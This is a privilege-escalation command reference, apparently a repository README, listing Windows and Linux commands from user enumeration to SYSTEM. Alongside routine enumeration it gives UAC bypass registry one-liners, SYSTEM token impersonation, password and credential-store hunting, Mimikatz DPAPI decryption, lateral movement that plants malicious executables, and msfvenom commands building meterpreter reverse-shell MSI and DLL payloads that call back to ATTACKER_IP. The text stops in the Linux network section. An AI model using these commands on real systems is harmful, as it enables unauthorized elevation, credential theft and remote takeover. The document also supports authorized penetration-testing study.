# privesc-commands-dictionary

<a name="top"></a>

---

## Privilege Escalation Commands

A structured reference for Windows and Linux privilege escalation. From user enumeration to root.

> **⚠️ Legal Disclaimer**  
> This guide is for **educational purposes only**. Only use these techniques on systems you own or have written permission to test. Unauthorized access is illegal.

> 📘 **New to privesc?** Start with the [TUTORIAL.md](TUTORIAL.md) for beginners.
> 📄 **Quick Reference:** [One-page cheat sheet](QUICKREF.md) for the most common commands.
> 🧠 **Operational Guide:** [GUIDE.md](GUIDE.md) for strategy and depth.

## 📖 Table of Contents

### Windows
1. [User Enumeration](#1-windows-user-enumeration)
2. [Group Enumeration](#2-windows-group-enumeration)
3. [System Information](#3-windows-system-information)
4. [Network Enumeration](#4-windows-network-enumeration)
5. [Service Enumeration](#5-windows-service-enumeration)
6. [Registry Checks](#6-windows-registry-checks)
7. [Scheduled Tasks](#7-windows-scheduled-tasks)
8. [Password Hunting](#8-windows-password-hunting)
9. [Privilege Escalation](#9-windows-privilege-escalation)
10. [UAC Bypass](#10-windows-uac-bypass)
11. [Token Manipulation](#11-windows-token-manipulation)
12. [Lateral Movement](#12-windows-lateral-movement)
13. [Always Install Elevated](#13-windows-always-install-elevated)
14. [Stored Credentials](#14-windows-stored-credentials)
15. [DLL Hijacking](#15-windows-dll-hijacking)

### Linux
16. [User Enumeration](#16-linux-user-enumeration)
17. [Group Enumeration](#17-linux-group-enumeration)
18. [System Information](#18-linux-system-information)
19. [Network Enumeration](#19-linux-network-enumeration)
20. [SUID/SGID Binaries](#20-linux-suid-sgid-binaries)
21. [Sudo Misconfigurations](#21-linux-sudo-misconfigurations)
22. [Cron Jobs](#22-linux-cron-jobs)
23. [Writable Files](#23-linux-writable-files)
24. [Kernel Exploits](#24-linux-kernel-exploits)
25. [Docker Breakout](#25-linux-docker-breakout)
26. [PATH Manipulation](#26-linux-path-manipulation)
27. [Wildcard Injection](#27-linux-wildcard-injection)
28. [Shared Library Hijacking](#28-linux-shared-library-hijacking)
29. [Capabilities](#29-linux-capabilities)
30. [Environment Variables](#30-linux-environment-variables)

### General
31. [Tools](#31-tools)
32. [Transferring Files](#32-transferring-files)
33. [Troubleshooting](#33-troubleshooting)
34. [Real-World Workflows](#34-real-world-workflows)

---

## Windows

### 1. Windows User Enumeration

| Command | Purpose |
|---------|---------|
| `whoami` | Current username |
| `whoami /priv` | Current user privileges (SeBackupPrivilege, SeImpersonatePrivilege, etc.) |
| `whoami /groups` | Current user group memberships (including integrity level) |
| `whoami /all` | All user information (username, SID, privileges, groups) |
| `echo %USERNAME%` | Current username (CMD) |
| `$env:USERNAME` | Current username (PowerShell) |
| `net user` | List all local users |
| `net user username` | Detailed information about a specific user |
| `net user username /domain` | Domain user information (if domain joined) |
| `Get-LocalUser` | PowerShell: list all local users |
| `Get-LocalUser \| Select-Object Name,Enabled,LastLogon` | PowerShell: list users with status and last logon |
| `Get-LocalUser \| Where-Object {$_.Enabled -eq $true}` | PowerShell: list only enabled users |
| `wmic useraccount get name,sid,disabled,status` | WMIC: list users with SIDs and status |
| `wmic useraccount where "name='username'" get sid` | WMIC: get SID of specific user |
| `query user` | Currently logged-in users |
| `qwinsta` | Currently logged-in sessions (more detailed) |
| `quser` | Same as `query user` (some systems) |
| `net accounts` | Password policy (min password age, max password age, lockout threshold) |
| `net accounts /domain` | Domain password policy (if domain joined) |

[🔝 Back to Top](#top)

### 2. Windows Group Enumeration

| Command | Purpose |
|---------|---------|
| `net localgroup` | List all local groups |
| `net localgroup Administrators` | List members of Administrators group |
| `net localgroup "Remote Desktop Users"` | List members of RDP group |
| `net localgroup "Performance Log Users"` | Check for potentially exploitable groups |
| `net group /domain` | List all domain groups (if domain joined) |
| `net group "Domain Admins" /domain` | List Domain Admins members (if domain joined) |
| `net group "Enterprise Admins" /domain` | List Enterprise Admins (if domain joined) |
| `net group "Domain Controllers" /domain` | List domain controllers (if domain joined) |
| `Get-LocalGroup` | PowerShell: list all local groups |
| `Get-LocalGroupMember Administrators` | PowerShell: list Administrators members |
| `Get-LocalGroupMember -Name "Administrators" \| Select-Object Name,PrincipalSource` | PowerShell: detailed admin group info |
| `Get-LocalGroup \| ForEach-Object { Get-LocalGroupMember -Name $_.Name } \| Where-Object {$_.PrincipalSource -ne "Local"}` | PowerShell: find domain users in local groups |
| `wmic group get name` | WMIC: list local groups |
| `wmic path win32_groupuser where (groupcomponent="win32_group.name='Administrators',domain='%COMPUTERNAME%'")` | WMIC: get members of Administrators group |
| `net localgroup "Backup Operators"` | Check Backup Operators group (can backup files, including SAM) |

[🔝 Back to Top](#top)

### 3. Windows System Information

| Command | Purpose |
|---------|---------|
| `systeminfo` | Full system information (OS version, patches, hotfixes, BIOS, RAM, network) |
| `systeminfo \| findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"` | OS name, version, and architecture |
| `systeminfo \| findstr /C:"Hotfix(s)"` | Installed patches (useful for kernel exploit identification) |
| `hostname` | Computer name |
| `echo %COMPUTERNAME%` | Computer name (CMD) |
| `$env:COMPUTERNAME` | Computer name (PowerShell) |
| `Get-ComputerInfo` | PowerShell: detailed system information |
| `Get-WmiObject -Class Win32_OperatingSystem` | PowerShell: OS information (version, build, service pack) |
| `wmic os get caption,version,csdversion,osarchitecture` | WMIC: OS version and architecture |
| `wmic os get totalvisiblememorysize` | Total RAM (visible to OS) |
| `wmic computersystem get manufacturer,model,totalphysicalmemory` | Manufacturer, model, and total RAM |
| `wmic computersystem get domain` | Domain membership |
| `wmic bios get serialnumber` | BIOS serial number (asset tracking, sometimes service tags) |
| `reg query "HKLM\Hardware\Description\System\CentralProcessor\0" /v ProcessorNameString` | CPU model |
| `Get-HotFix` | PowerShell: list installed hotfixes |
| `Get-HotFix \| Select-Object HotFixID,InstalledOn` | PowerShell: hotfixes with installation dates |
| `wmic qfe list brief /format:texttable` | WMIC: list hotfixes (alternate method) |

[🔝 Back to Top](#top)

### 4. Windows Network Enumeration

| Command | Purpose |
|---------|---------|
| `ipconfig /all` | Full network configuration (IP, DNS, DHCP, MAC address) |
| `ipconfig /displaydns` | Show DNS cache |
| `ipconfig /flushdns` | Flush DNS cache (requires admin) |
| `route print` | Routing table |
| `route print -4` | IPv4 routes only |
| `arp -a` | ARP cache (shows other hosts on the same network) |
| `netstat -ano` | Active connections with listening ports and PIDs |
| `netstat -ano \| findstr LISTENING` | Listening ports only |
| `netstat -ano \| findstr ESTABLISHED` | Established connections only |
| `netstat -ano \| findstr TCP` | TCP connections only |
| `netstat -ano \| findstr UDP` | UDP connections only |
| `netstat -rn` | Routing table (same as `route print`) |
| `nslookup domain.com` | DNS lookup |
| `nslookup -type=MX domain.com` | Mail exchange record lookup |
| `ping -n 1 COMPUTERNAME` | Test connectivity to a host |
| `tracert 8.8.8.8` | Trace route to external IP |
| `Get-NetTCPConnection` | PowerShell: active TCP connections |
| `Get-NetUDPEndpoint` | PowerShell: active UDP connections |
| `Get-NetRoute` | PowerShell: routing table |
| `Get-NetAdapter \| Select-Object Name,InterfaceDescription,MacAddress,Status` | PowerShell: network adapter information |
| `netsh advfirewall show allprofiles` | Firewall rules summary |
| `netsh advfirewall firewall show rule name=all` | All firewall rules (verbose) |
| `netsh advfirewall show currentprofile` | Current firewall profile (Domain/Private/Public) |
| `netsh wlan show profiles` | Saved Wi-Fi profiles |
| `netsh wlan show profile name="PROFILE_NAME" key=clear` | Clear-text Wi-Fi password for saved profile (requires admin or key material privilege) |
| `Get-NetFirewallProfile` | PowerShell: firewall profiles |
| `Get-NetFirewallRule \| Where-Object {$_.Enabled -eq $true} \| Select-Object DisplayName,Direction,Action` | PowerShell: enabled firewall rules |

[🔝 Back to Top](#top)

### 5. Windows Service Enumeration

| Command | Purpose |
|---------|---------|
| `sc query` | List running services |
| `sc query state= all` | List all services (running + stopped) |
| `sc query state= all \| findstr SERVICE_NAME` | Extract service names from all services |
| `sc qc SERVICE_NAME` | Query specific service configuration (binary path, start type, account) |
| `sc config SERVICE_NAME` | Show service configuration (alternate method) |
| `sc start SERVICE_NAME` | Start a service (if you have permission) |
| `sc stop SERVICE_NAME` | Stop a service (if you have permission) |
| `sc sdshow SERVICE_NAME` | Show service security descriptor (check permissions) |
| `wmic service get name,displayname,pathname,startname,startmode,state` | WMIC: list services with paths and start accounts |
| `wmic service where "name='SERVICE_NAME'" get pathname,startname` | WMIC: specific service details |
| `wmic service where "startname='LocalSystem' and state='Running'" get name,pathname` | WMIC: find services running as SYSTEM |
| `Get-Service` | PowerShell: list all services |
| `Get-Service \| Where-Object {$_.Status -eq "Running"}` | PowerShell: running services only |
| `Get-CimInstance Win32_Service \| Select-Object Name,StartName,State,PathName` | PowerShell: detailed service info |
| `Get-CimInstance Win32_Service \| Where-Object {$_.StartName -eq "LocalSystem"}` | PowerShell: services running as SYSTEM |
| `Get-CimInstance Win32_Service \| Where-Object {$_.PathName -match "Program Files"}` | PowerShell: services with paths containing spaces (potential unquoted path) |
| `accesschk.exe -uwcqv "Authenticated Users" *` | Check service permissions for non-admin users (Sysinternals) |
| `accesschk.exe -uwcqv "BUILTIN\Users" *` | Check service permissions for standard users (Sysinternals) |
| `accesschk.exe -uwcqv "Everyone" *` | Check service permissions for Everyone group (Sysinternals) |
| `Get-CimInstance Win32_Service \| ForEach-Object { $_.Name; $_.GetSecurityDescriptor().Descriptor }` | PowerShell: get service security descriptors |

[🔝 Back to Top](#top)

### 6. Windows Registry Checks

| Command | Purpose |
|---------|---------|
| `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run` | Startup programs (local machine, all users) |
| `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run` | Startup programs (current user only) |
| `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce` | One-time startup programs (local machine) |
| `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce` | One-time startup programs (current user) |
| `reg query HKLM\SYSTEM\CurrentControlSet\Services` | All service registry keys (check for weak permissions) |
| `reg query HKLM\SYSTEM\CurrentControlSet\Services\SERVICE_NAME` | Specific service registry key |
| `reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon` | Winlogon settings (may contain autologon credentials) |
| `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword` | Check for autologon password (plaintext) |
| `reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName` | Check for autologon username |
| `reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword` | Current user autologon (rare) |
| `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System` | System policies (UAC settings, etc.) |
| `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` | Check if UAC is enabled (1=enabled, 0=disabled) |
| `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin` | UAC admin prompt behavior |
| `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` | Recent Run commands history |
| `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Group Policy\History` | Group Policy history |
| `Get-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Run` | PowerShell: startup programs (local machine) |
| `Get-ItemProperty -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Run` | PowerShell: startup programs (current user) |
| `Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services"` | PowerShell: service registry keys |
| `Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" \| Select-Object DefaultUserName,DefaultPassword` | PowerShell: check for autologon credentials |
| `Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\SERVICE_NAME` | PowerShell: check service registry ACLs (for weak permissions) |

[🔝 Back to Top](#top)

### 7. Windows Scheduled Tasks

| Command | Purpose |
|---------|---------|
| `schtasks /query /fo LIST /v` | List all scheduled tasks (verbose, includes paths and accounts) |
| `schtasks /query /fo CSV /v` | List scheduled tasks in CSV format (easier to parse) |
| `schtasks /query /tn TASK_NAME /fo LIST /v` | Details of a specific task |
| `schtasks /create /tn "TASK_NAME" /tr "C:\path\to\malicious.exe" /sc ONLOGON /ru SYSTEM` | Create a new scheduled task (requires admin or permission) |
| `schtasks /change /tn TASK_NAME /tr "C:\path\to\malicious.exe"` | Change existing task's executable (requires permission) |
| `schtasks /run /tn TASK_NAME` | Run a scheduled task immediately |
| `schtasks /end /tn TASK_NAME` | Stop a running scheduled task |
| `schtasks /delete /tn TASK_NAME /f` | Delete a scheduled task (force) |
| `Get-ScheduledTask` | PowerShell: list all scheduled tasks |
| `Get-ScheduledTask \| Where-Object {$_.State -ne "Disabled"}` | PowerShell: list enabled tasks only |
| `Get-ScheduledTask -TaskName TASK_NAME` | PowerShell: specific task details |
| `Get-ScheduledTask \| Where-Object {$_.Principal.UserId -eq "SYSTEM"}` | PowerShell: tasks running as SYSTEM |
| `Get-ScheduledTask \| Where-Object {$_.Principal.UserId -eq "INTERACTIVE"}` | PowerShell: tasks running as current user |
| `Get-ScheduledTask \| Where-Object {$_.Actions.Execute -like "*Program Files*"}` | PowerShell: tasks with paths containing spaces (potential unquoted path) |
| `Get-ScheduledTask \| Where-Object {$_.Triggers -ne $null} \| Select-Object TaskName,State,Triggers` | PowerShell: tasks with triggers |
| `schtasks /query /fo LIST /v \| findstr /i "task to run"` | Extract executable paths from tasks |
| `schtasks /query /fo LIST /v \| findstr /i "run as user"` | Extract user accounts tasks run as |

[🔝 Back to Top](#top)

### 8. Windows Password Hunting

| Command | Purpose |
|---------|---------|
| `findstr /si password *.txt` | Search text files for "password" |
| `findstr /si password *.ini` | Search INI files for "password" |
| `findstr /si password *.config` | Search config files for "password" |
| `findstr /si password *.xml` | Search XML files for "password" |
| `findstr /si password *.bat` | Search batch files for "password" |
| `findstr /si password *.ps1` | Search PowerShell scripts for "password" |
| `findstr /si "pass=" *.txt *.ini *.config` | Search for "pass=" in configuration files |
| `findstr /si "pwd=" *.txt *.ini *.config` | Search for "pwd=" in configuration files |
| `findstr /si "cred=" *.txt *.ini *.config` | Search for "cred=" in configuration files |
| `findstr /si "secret" *.txt *.config` | Search for "secret" in files |
| `dir /s *pass* *cred* *vnc* *.config*` | Search for common password-related filenames |
| `dir /s *key* *cert* *pfx*` | Search for certificate and key files |
| `Get-ChildItem -Recurse -Include *.txt,*.ini,*.config,*.xml -Force \| Select-String "password"` | PowerShell: search files for "password" |
| `Get-ChildItem -Recurse -Include *.ps1,*.bat,*.cmd -Force \| Select-String "password"` | PowerShell: search scripts for "password" |
| `Get-ChildItem -Path C:\Users\ -Include *.kdbx -Recurse -ErrorAction SilentlyContinue` | Find KeePass database files |
| `Get-ChildItem -Path C:\ -Include *.ovpn -Recurse -ErrorAction SilentlyContinue` | Find OpenVPN config files (contain credentials) |
| `Get-ChildItem -Path C:\ -Include *.rdp -Recurse -ErrorAction SilentlyContinue` | Find RDP connection files (stored credentials) |
| `Get-ChildItem -Path C:\Users -Include *.vdi,*.vmdk,*.vhdx -Recurse -ErrorAction SilentlyContinue` | Find virtual machine disk files (may contain credentials) |
| `Get-Process lsass \| ForEach-Object { $_.Modules }` | PowerShell: list LSASS modules (prerequisite for credential dumping) |
| `reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /v CommunityName` | SNMP community strings (plaintext) |
| `reg query HKCU\Software\ORL\VNC\Viewer\MRU` | VNC credentials in registry (plaintext or weakly encrypted) |
| `reg query HKLM\Software\TightVNC\Server /v Password` | TightVNC password (obfuscated, but crackable) |

[🔝 Back to Top](#top)

### 9. Windows Privilege Escalation

| Command | Purpose |
|---------|---------|
| `whoami /priv` | Show current user's privileges (SeBackupPrivilege, SeImpersonatePrivilege, etc.) |
| `whoami /groups` | Show group memberships (including medium/mandatory level) |
| `net localgroup Administrators` | Check if current user is in Administrators group |
| `net localgroup Administrators username /add` | Add user to Administrators (requires existing admin) |
| `net localgroup "Backup Operators" username /add` | Add user to Backup Operators (can backup SAM/SYSTEM) |
| `net localgroup "Remote Management Users" username /add` | Add user to Remote Management (WinRM access) |
| `net localgroup "Event Log Readers" username /add` | Add user to Event Log Readers (can read security logs) |
| `runas /user:Administrator cmd.exe` | Run as Administrator (if password known) |
| `runas /netonly /user:DOMAIN\username cmd.exe` | Run as domain user (for network access only, no local elevation) |
| `Start-Process powershell -Verb RunAs` | PowerShell: run as Administrator (prompts for UAC) |
| `Start-Process cmd.exe -Verb RunAs` | PowerShell: run cmd as Administrator (prompts for UAC) |
| `Start-Process powershell -Verb RunAs -WindowStyle Hidden` | PowerShell: run hidden as Administrator (prompts) |
| `Start-Process powershell -Credential (Get-Credential)` | PowerShell: run as different user (prompts for credentials) |
| `Get-LocalGroupMember Administrators` | PowerShell: list current Administrators members |
| `Add-LocalGroupMember -Group "Administrators" -Member "DOMAIN\username"` | PowerShell: add domain user to Administrators (requires admin) |
| `Get-User -Identity username \| Enable-ADAccount` | PowerShell: enable disabled AD account (requires AD privileges) |

[🔝 Back to Top](#top)

### 10. Windows UAC Bypass

| Command | Purpose |
|---------|---------|
| `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System` | Check UAC settings |
| `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` | UAC status (1=enabled, 0=disabled) |
| `reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin` | Admin prompt behavior (0=auto-elevate, 2=prompt, 5=require secure desktop) |
| `reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System` | Current user UAC settings |
| `reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f` | Disable UAC (requires admin, needs reboot) |
| `reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f` | Set UAC to auto-elevate (requires admin) |
| `reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f` | Disable secure desktop for UAC prompts |
| `Get-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System` | PowerShell: check UAC settings |

- **Common UAC bypass techniques (abusing auto-elevated executables):**

| Technique | Command |
|-----------|---------|
| fodhelper bypass | `reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\System32\cmd.exe" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_DWORD /d 0 /f` |
| sdclt bypass | `reg add HKCU\Software\Classes\exefile\shell\open\command /d "C:\Windows\System32\cmd.exe" /f && reg add HKCU\Software\Classes\exefile\shell\open\command /v DelegateExecute /t REG_DWORD /d 0 /f` |
| ComputerDefaults bypass | `reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\System32\cmd.exe" /f` |
| SilentCleanup bypass | `schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup` |

> **Note:** These bypasses work only when UAC is not set to "Always notify". They also require the user to be in the Administrators group.

[🔝 Back to Top](#top)

### 11. Windows Token Manipulation

| Command | Purpose |
|---------|---------|
| `whoami /groups \| findstr "Token"` | Check available tokens |
| `whoami /groups \| findstr "Mandatory"` | Check integrity level (Low/Medium/High/System) |
| `Start-Process cmd.exe -Verb RunAs` | Run as elevated (if admin, prompts UAC) |
| `Start-Process powershell.exe -Credential (Get-Credential)` | Run as different user (prompts for credentials) |
| `Invoke-Command -ScriptBlock { whoami } -Session $session` | Run command in another session (requires PowerShell Remoting) |
| `runas /netonly /user:DOMAIN\username cmd.exe` | Run as domain user for network access only (no local elevation) |
| `runas /netonly /user:DOMAIN\username "powershell -c Invoke-Mimikatz"` | Run Mimikatz with domain user context for network authentication |

- **Tools for token manipulation:**
  - `Incognito` (part of Metasploit) - steal and impersonate tokens
  - `Invoke-TokenManipulation.ps1` (PowerShell) - list and impersonate tokens
  - `Invoke-TokenManipulation -Enumerate` - list all available tokens
  - `Invoke-TokenManipulation -ImpersonateUser -Username "SYSTEM"` - impersonate SYSTEM token
  - `Invoke-TokenManipulation -CreateProcess -ProcessPath "C:\Windows\System32\cmd.exe" -Username "NT AUTHORITY\SYSTEM"` - create new process with SYSTEM   token

[🔝 Back to Top](#top)

### 12. Windows Lateral Movement

| Command | Purpose |
|---------|---------|
| `net view` | List computers in the domain |
| `net view \\COMPUTERNAME` | List shares on a remote computer |
| `net view /domain` | List domains in the current network |
| `net view /domain:DOMAINNAME` | List computers in a specific domain |
| `net use \\COMPUTERNAME\C$ /user:DOMAIN\username password` | Map remote C$ share |
| `net use \\COMPUTERNAME\ADMIN$ /user:DOMAIN\username password` | Map remote ADMIN$ share (Windows directory) |
| `net use \\COMPUTERNAME\IPC$` | Connect to remote IPC$ (null session) |
| `dir \\COMPUTERNAME\C$\Users` | List users on remote computer |
| `copy malicious.exe \\COMPUTERNAME\C$\Windows\Temp` | Copy file to remote computer |
| `psexec \\COMPUTERNAME -u username -p password cmd.exe` | Execute command remotely (PsExec from Sysinternals) |
| `psexec \\COMPUTERNAME -s cmd.exe` | Execute as SYSTEM remotely (requires admin) |
| `wmic /node:COMPUTERNAME process call create "cmd.exe /c command"` | WMIC: execute command remotely |
| `wmic /node:COMPUTERNAME /user:DOMAIN\username /password:password process call create "cmd.exe"` | WMIC: execute with credentials |
| `wmic /node:@computers.txt process call create "cmd.exe /c command"` | WMIC: execute on multiple computers from file |
| `Enter-PSSession -ComputerName COMPUTERNAME` | PowerShell Remoting (requires admin, WinRM enabled) |
| `Enter-PSSession -ComputerName COMPUTERNAME -Credential (Get-Credential)` | PowerShell Remoting with credentials |
| `Invoke-Command -ComputerName COMPUTERNAME -ScriptBlock { command }` | PowerShell: run command on remote computer |
| `Invoke-Command -ComputerName COMPUTERNAME -FilePath script.ps1` | PowerShell: run script on remote computer |
| `Invoke-Command -ComputerName @("COMPUTER1","COMPUTER2") -ScriptBlock { command }` | PowerShell: run command on multiple computers |
| `New-PSSession -ComputerName COMPUTERNAME` | Create persistent PowerShell session |
| `Get-PSSession` | List active PowerShell sessions |
| `Remove-PSSession -Session $session` | Close PowerShell session |
| `Test-WSMan -ComputerName COMPUTERNAME` | Test if WinRM is enabled |
| `schtasks /create /s COMPUTERNAME /tn "TASK_NAME" /tr "C:\path\to\malicious.exe" /sc ONLOGON /ru SYSTEM` | Create scheduled task remotely |
| `schtasks /run /s COMPUTERNAME /tn "TASK_NAME"` | Run scheduled task remotely |
| `sc \\COMPUTERNAME query` | List services on remote computer |
| `sc \\COMPUTERNAME stop SERVICE_NAME` | Stop remote service |
| `sc \\COMPUTERNAME start SERVICE_NAME` | Start remote service |
| `sc \\COMPUTERNAME config SERVICE_NAME binPath= "C:\malicious.exe"` | Change remote service binary path |

[🔝 Back to Top](#top)

### 13. Windows Always Install Elevated

- Always Install Elevated is a Windows Installer policy that allows non-admin users to install MSI packages with SYSTEM privileges.

- **Check if enabled:**
```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

- PowerShell check:

```powershell
Get-ItemProperty -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
Get-ItemProperty -Path HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
```

- If both return 1, you can execute MSI packages as SYSTEM:

```cmd
msiexec /quiet /i malicious.msi
```

- Generate malicious MSI (on attacker machine):

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o malicious.msi
```
[🔝 Back to Top](#top)

### 14. Windows Stored Credentials

|Command |Purpose|
|-----|-----|
|`cmdkey /list`| List stored credentials (Windows Credential Manager)|
|`cmdkey /add:COMPUTERNAME /user:DOMAIN\username /pass:password`| Add stored credential|
|`cmdkey /delete:COMPUTERNAME` |Delete stored credential|
|`vaultcmd /listcreds:`| List credentials in Windows Vault|
|`rundll32.exe keymgr.dll,KRShowKeyMgr`| Open GUI Credential Manager|
|`dir /s *cred* *vault* *pass* %APPDATA%\Microsoft\Credentials\`| Search for credential files|
|`dir %APPDATA%\Microsoft\Credentials\`| List saved credentials GUIDs|
|`Get-ChildItem -Path "$env:APPDATA\Microsoft\Credentials\" -Force`| PowerShell: list saved credentials GUIDs|
|`vaultcmd /list:`| List available vaults|
|`vaultcmd /listcreds:"Windows Credentials" /all`| PowerShell: list all credentials (requires vaultcmd)|

- **Decrypt stored credentials (requires SYSTEM):**

```cmd
* After gaining SYSTEM, use Mimikatz
mimikatz.exe "dpapi::cred /in:C:\Users\USERNAME\AppData\Local\Microsoft\Credentials\CRED_GUID"
```

[🔝 Back to Top](#top)

### 15. Windows DLL Hijacking

- DLL Hijacking occurs when an application loads a DLL from an insecure location (like a user-writable directory) before the legitimate location.

- **Check application paths:**

```cmd
wmic process get name,executablepath
```

- **Look for missing DLLs using Process Monitor (ProcMon):**

  - 1. Run ProcMon as admin
  - 2. Add filter: Process Name is TARGET_EXE
  - 3. Add filter: Result is NAME NOT FOUND
  - 4. Look for DLLs loaded from writable directories

- **Exploitation steps:**

  - 1. Identify a service or application running as SYSTEM
  - 2. Find a missing DLL that the application tries to load
  - 3. Place a malicious DLL in a writable directory where the application searches
  - 4. Restart the service or wait for reboot

- **Generate malicious DLL (on attacker machine):**

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o malicious.dll
```

---
---

## Linux

[🔝 Back to Top](#top)

### 16. Linux User Enumeration

| Command | Purpose |
|---------|---------|
| `whoami` | Current username |
| `id` | Current user ID, group ID, and group memberships |
| `id username` | Information about a specific user (if you know the username) |
| `cat /etc/passwd` | List all local users |
| `cat /etc/passwd \| grep /bin/bash` | Users with bash as default shell |
| `cat /etc/passwd \| grep /bin/sh` | Users with sh as default shell |
| `cat /etc/passwd \| grep -E "/(bash|sh)$"` | Users with any shell |
| `cat /etc/passwd \| grep -v /nologin \| grep -v /false` | Users with valid login shells |
| `getent passwd` | List all users (including LDAP/SSSD) |
| `getent passwd username` | Specific user info (including LDAP) |
| `last` | Last logged-in users (from /var/log/wtmp) |
| `lastlog` | Last login time for all users |
| `lastlog -u username` | Last login for specific user |
| `w` | Currently logged-in users with activity |
| `who` | Currently logged-in users |
| `users` | List currently logged-in usernames |
| `ls /home` | List user home directories |
| `ls /root` | List root home directory (requires root) |
| `find /home -maxdepth 1 -type d` | Alternative way to list user home directories |
| `cat /etc/shadow \| grep -v ":\*:\|:!\|:x:"` | Find users with weak password hashes (requires root) |
| `awk -F: '($3 == 0) {print}' /etc/passwd` | Find UID 0 users (any user with root privileges) |
| `awk -F: '($3 >= 1000) {print}' /etc/passwd` | Find human users (UID >= 1000 on most systems) |

[🔝 Back to Top](#top)

### 17. Linux Group Enumeration

| Command | Purpose |
|---------|---------|
| `groups` | Current user's groups |
| `groups username` | Specific user's groups |
| `id -Gn` | Current user's group names (numeric) |
| `id -gn` | Current user's primary group name |
| `cat /etc/group` | All system groups |
| `cat /etc/group \| grep sudo` | Users in sudo group |
| `cat /etc/group \| grep wheel` | Users in wheel group (some distros) |
| `cat /etc/group \| grep admin` | Users in admin group (some distros) |
| `cat /etc/group \| grep docker` | Users in docker group (can escape to host) |
| `cat /etc/group \| grep lxd` | Users in lxd group (can escape to host) |
| `getent group` | All groups (including LDAP) |
| `getent group groupname` | Specific group info (including LDAP) |
| `members groupname` | List members of a group (requires `members` package) |
| `grep -E "sudo\|wheel\|admin\|docker\|lxd" /etc/group` | Find high-value groups |
| `awk -F: '{print $1, $4}' /etc/passwd` | Show primary group assignments |

[🔝 Back to Top](#top)

### 18. Linux System Information

| Command | Purpose |
|---------|---------|
| `uname -a` | Kernel version and system info (name, version, architecture) |
| `uname -r` | Kernel release only |
| `uname -m` | Machine hardware architecture (x86_64, aarch64, etc.) |
| `cat /etc/os-release` | Distribution information (ID, version, name) |
| `lsb_release -a` | Distribution version (if installed) |
| `cat /etc/*-release` | Distribution info (fallback for older systems) |
| `hostname` | Hostname |
| `hostnamectl` | Hostname and system info (systemd systems) |
| `env` | All environment variables |
| `set` | All environment variables and shell variables |
| `printenv` | Print environment variables |
| `printenv PATH` | Show PATH variable |
| `cat /etc/profile` | System-wide environment settings |
| `cat ~/.bashrc` | Current user's bash configuration |
| `arch` | System architecture (same as `uname -m`) |
| `lscpu` | CPU information (model, cores, threads) |
| `cat /proc/cpuinfo` | Raw CPU information |
| `free -h` | Memory usage (human-readable) |
| `free -m` | Memory usage (MB) |
| `df -h` | Disk usage (human-readable) |
| `df -ha` | Disk usage including pseudo filesystems |
| `mount` | Mounted filesystems |
| `cat /proc/mounts` | Mounted filesystems (raw) |
| `lsblk` | Block devices (disks, partitions) |
| `fdisk -l` | Partition table (requires root) |
| `cat /etc/fstab` | Filesystems mounted at boot |
| `uptime` | System uptime and load average |
| `date` | Current system time |
| `last reboot` | Reboot history |
| `dmesg \| tail -20` | Recent kernel messages |
| `cat /var/log/syslog \| tail -20` | Recent system logs (Debian/Ubuntu) |
| `cat /var/log/messages \| tail -20` | Recent system logs (RHEL/CentOS) |
| `systemctl list-units --type=service --state=running` | Running systemd services (systemd systems) |
| `systemctl list-units --type=service --state=failed` | Failed systemd services |

[🔝 Back to Top](#top)

### 19. Linux Network Enumeration

| Command | Purpose |
|---------|---------|
| `ifconfig` | Network interfaces (legacy, may need net-tools) |
| `ip a` | Network interfaces (modern) |
| `ip r` | Routing table (modern) |
